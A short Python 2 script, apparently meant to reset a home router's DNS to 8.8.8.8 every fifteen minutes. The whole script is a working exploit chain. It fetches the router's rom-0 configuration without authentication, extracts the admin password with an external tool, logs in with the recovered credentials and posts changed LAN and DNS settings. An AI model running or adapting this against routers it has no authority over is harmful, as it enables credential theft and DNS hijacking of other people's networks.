import sys
import urllib
import urllib2
import subprocess
import base64
import threading
import time
import os
import getopt

#Intialization
timeinterval = 15*60

#Options
options, remainder = getopt.getopt(sys.argv[1:], 'i:')
                                                         
for opt, arg in options:
    if opt in ('-i'):
        timeinterval = int(arg)


#Timer
def RomPatcher(timeinterval):
    threading.Timer(timeinterval, RomPatcher,args=(timeinterval,)).start()
    print "Changing DNS to 8.8.8.8"
    #Execute POST Request
    try:
        #Download Rom-0 and Extract Password
        rom0file = urllib2.urlopen("http://192.168.1.1/rom-0")
        with open('rom0','wb') as output:
          output.write(rom0file.read())

        if os.name == 'nt':
            proc=subprocess.Popen("PasswordExtractor rom0",  stdout=subprocess.PIPE, shell=True)  
        elif os.name == 'posix':
            proc=subprocess.Popen("./PasswordExtractor rom0",  stdout=subprocess.PIPE, shell=True)
            
        rom0password = proc.stdout.read()

        #POST request data and headers
        username= "admin"
        password=rom0password
        print("Current password: %s" % rom0password)
        base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
        
        values = {'uiViewIPAddr': '192.168.1.1',
                  'dhcpFlag': '0',
                  'ipAddrMain': '192.168.1.1',
                  'uiViewNetMask': '=255.255.255.0',
                  'lan_RIPVersion': 'RIP1',
                  'lan_RIPDirection': 'Both',
                  'lan_IGMP': 'Disabled',
                  'igmp_snoop_act': '0',
                  'dhcpTypeRadio': '1',
                  'dhcp_StartIP': '192.168.1.2',
                  'sysPoolCount': '200',
                  'dhcp_LeaseTime': '259200',
                  'ST_IPAddr_Select': '00000000',
                  'ST_MACAddr': '',
                  'ST_MACAddr_Select': '00000004',
                  'ST_MACChangeFlag': '1',
                  'ST_Count': '4',
                  'ST_Status_Select': 'Static',
                  'uiViewDNSRelay': 'Use User Discovered DNS Server Only',
                  'uiViewDns1Mark': '8.8.8.8',
                  'uiViewDns2Mark': '8.8.8.8' }
        headers = { 'Authorization': 'Basic %s' % base64string, 
                    'Content-Type':'application/x-www-form-urlencoded'}
        data = urllib.urlencode(values)
        #Change DNS Request
        req = urllib2.Request('http://192.168.1.1/Forms/home_lan_1',data, headers)
        response = urllib2.urlopen(req)
        if response.getcode() == 200:
            print "DNS Changed."
    except:
        print "Unexpected error:", sys.exc_info()[0]
    print time.strftime("%I:%M:%S")
    
RomPatcher(timeinterval)